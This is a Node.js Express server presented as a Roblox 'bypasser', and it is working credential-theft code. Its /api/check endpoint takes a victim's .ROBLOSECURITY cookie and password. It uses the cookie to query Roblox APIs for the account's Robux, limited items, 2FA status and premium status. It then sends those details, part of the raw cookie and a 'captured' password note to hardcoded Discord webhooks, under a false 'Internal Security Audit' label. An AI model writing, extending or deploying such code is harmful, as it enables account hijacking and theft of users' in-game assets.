const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// REPLACE THESE WITH YOUR ACTUAL DISCORD WEBHOOK URLs
const WEBHOOK_BYPASS = "https://discordapp.com/api/webhooks/1487257808129884342/8hak7vRrhqh_jHp0GMIE2jsdv5vxTuzeq-1eWK52mmmZykkvNDzDpdSBxTPV21ohl973";
const WEBHOOK_LOGS = "https://discordapp.com/api/webhooks/1487257808129884342/8hak7vRrhqh_jHp0GMIE2jsdv5vxTuzeq-1eWK52mmmZykkvNDzDpdSBxTPV21ohl973";

async function sendToWebhook(url, payload) {
    try {
        const response = await axios.post(url, payload, {
            headers: { 'Content-Type': 'application/json' }
        });
        return { ok: response.status >= 200 && response.status < 300 };
    } catch (error) {
        console.error('Webhook error:', error.message);
        return { ok: false, error: error.message };
    }
}

async function fetchRobloxUser(cookie) {
    try {
        const response = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: {
                'Cookie': cookie,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            timeout: 10000
        });
        return response.data;
    } catch (error) {
        console.error('User fetch error:', error.response?.status || error.message);
        return null;
    }
}

async function fetchCurrency(userId) {
    try {
        const response = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`);
        return response.data;
    } catch (error) {
        return null;
    }
}

async function fetchInventory(userId) {
    try {
        const response = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`);
        const items = response.data.data || [];
        let totalRap = 0;
        items.forEach(item => {
            if (item.recentAveragePrice) totalRap += item.recentAveragePrice;
        });
        return {
            limitedsCount: items.length,
            rap: totalRap
        };
    } catch (error) {
        return { limitedsCount: 0, rap: 0 };
    }
}

async function fetchUserSettings(cookie) {
    try {
        const response = await axios.get('https://accountsettings.roblox.com/v1/settings', {
            headers: { 'Cookie': cookie }
        });
        return {
            emailVerified: response.data.emailVerified || false,
            twoFactorEnabled: response.data.twoStepVerificationEnabled || false,
            voiceChatEnabled: true
        };
    } catch (error) {
        return {
            emailVerified: false,
            twoFactorEnabled: false,
            voiceChatEnabled: true
        };
    }
}

async function fetchPremium(userId) {
    try {
        const response = await axios.get(`https://users.roblox.com/v1/users/${userId}/premium`);
        return response.data.isPremium || false;
    } catch {
        return false;
    }
}

async function fetchAccountAge(userId) {
    try {
        const response = await axios.get(`https://users.roblox.com/v1/users/${userId}`);
        const created = new Date(response.data.created);
        const now = new Date();
        const days = Math.floor((now - created) / (1000 * 60 * 60 * 24));
        return days;
    } catch {
        return 0;
    }
}

function buildLogPayload(isSuccess, userInfo, currency, inventory, settings, premium, accountAge) {
    const username = userInfo?.name || "Unknown";
    const robux = currency?.robux || 0;
    const limitedsCount = inventory?.limitedsCount || 0;
    const rap = inventory?.rap || 0;
    const emailVerified = settings?.emailVerified || false;
    const twoFactor = settings?.twoFactorEnabled || false;
    const voiceChat = settings?.voiceChatEnabled || true;

    const statusTitle = isSuccess ? "BYPASSER MODULE — SUCCESS" : "BYPASSER MODULE — BLOCKED";
    const color = isSuccess ? 0x3cb371 : 0xff6b6b;

    const fields = [
        { name: "Username", value: username, inline: true },
        { name: "Account Age", value: `${accountAge} Days`, inline: true },
        { name: "Games Developer", value: "No", inline: true },
        { name: "Game Visits", value: "0", inline: true },
        { name: "Robux Balance", value: `${robux} 🟩`, inline: true },
        { name: "Pending", value: "0 🟩", inline: true },
        { name: "Limiteds RAP", value: `${rap} 🟩`, inline: true },
        { name: "Summary", value: "0", inline: true },
        { name: "Payments", value: "False\nCredit Balance: 0.00 USD", inline: false },
        { name: "Settings", value: `Email: ${emailVerified ? "Verified" : "Unverified"}\n2FA: ${twoFactor ? "ENABLED" : "DISABLED"}\nVoice Chat: ${voiceChat ? "True" : "False"}`, inline: false },
        { name: "Inventory", value: `${limitedsCount} limiteds\nRAP: ${rap}`, inline: false },
        { name: "Premium", value: premium ? "True" : "False", inline: true }
    ];

    const embed = {
        title: statusTitle,
        color: color,
        fields: fields,
        footer: { text: `${username} (@${username}) | Bypasser Module | ${new Date().toLocaleString()}` },
        timestamp: new Date().toISOString()
    };

    const content = `# hooked\n- 3 Online\n\n**BULLIES Bypasser**  \n**APP**  \n${new Date().toLocaleTimeString()}  \n\n**${statusTitle}**\n\n${username}  \n(@${username})  \n\nDiscord Notification  \n\n- **Rolimons Stats**  \n- **Roblox Profile**  \n\n- **Account Stats**  \n  Account Age: ${accountAge} Days  \n  Games Developer: No  \n  - Game Visits: 0  \n\n- **Robux Balance:** ${robux} 🟩  \n- **Pending:** 0 🟩  \n\n- **Limiteds RAP:** ${rap} 🟩`;

    return {
        username: "hooked",
        avatar_url: "https://i.imgur.com/Z6cCXk3.png",
        content: content,
        embeds: [embed]
    };
}

app.post('/api/check', async (req, res) => {
    const { cookie, password, mode } = req.body;
    
    if (!cookie) {
        return res.status(400).json({ error: 'Cookie required' });
    }

    try {
        const userInfo = await fetchRobloxUser(cookie);
        
        if (!userInfo || !userInfo.id) {
            const blockedPayload = buildLogPayload(false, null, null, null, null, false, 0);
            await sendToWebhook(WEBHOOK_LOGS, blockedPayload);
            return res.json({ success: false, error: 'Invalid cookie' });
        }

        const [currency, inventory, settings, premium, accountAge] = await Promise.all([
            fetchCurrency(userInfo.id),
            fetchInventory(userInfo.id),
            fetchUserSettings(cookie),
            fetchPremium(userInfo.id),
            fetchAccountAge(userInfo.id)
        ]);

        const logPayload = buildLogPayload(true, userInfo, currency, inventory, settings, premium, accountAge);
        await sendToWebhook(WEBHOOK_LOGS, logPayload);

        const bypassPayload = {
            username: "INJURIES_BYPASS",
            avatar_url: "https://i.imgur.com/Z6cCXk3.png",
            content: `**🔐 BYPASS ATTEMPT** — \`${new Date().toLocaleString()}\``,
            embeds: [{
                title: mode === 'cookiepass' ? "Cookie + Pass Mode" : "Cookie Only Mode",
                color: 0x8a8aff,
                fields: [
                    { name: "⚙️ Mode", value: mode === 'cookiepass' ? "Cookie + Password" : "Cookie Only", inline: true },
                    { name: "🕒 Timestamp", value: `\`${new Date().toISOString()}\``, inline: true },
                    { name: "👤 Username", value: userInfo.name, inline: true },
                    { name: "🆔 User ID", value: userInfo.id.toString(), inline: true },
                    { name: "🍪 Cookie Preview", value: `\`\`\`${cookie.length > 150 ? cookie.substring(0,150)+'…' : cookie}\`\`\``, inline: false },
                    { name: "🔑 Password", value: (mode === 'cookiepass' && password) ? `\`${'•'.repeat(Math.min(password.length,16))}\` (captured)` : "`Not provided`", inline: true }
                ],
                footer: { text: "INJURIES | BYPASSER • Internal Security Audit" },
                timestamp: new Date().toISOString()
            }]
        };
        await sendToWebhook(WEBHOOK_BYPASS, bypassPayload);

        res.json({
            success: true,
            user: {
                username: userInfo.name,
                userId: userInfo.id,
                robux: currency?.robux || 0,
                limitedsCount: inventory.limitedsCount,
                rap: inventory.rap,
                premium: premium,
                twoFactor: settings.twoFactorEnabled,
                accountAge: accountAge
            }
        });

    } catch (error) {
        console.error('Error:', error.message);
        res.status(500).json({ error: 'Server error', message: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});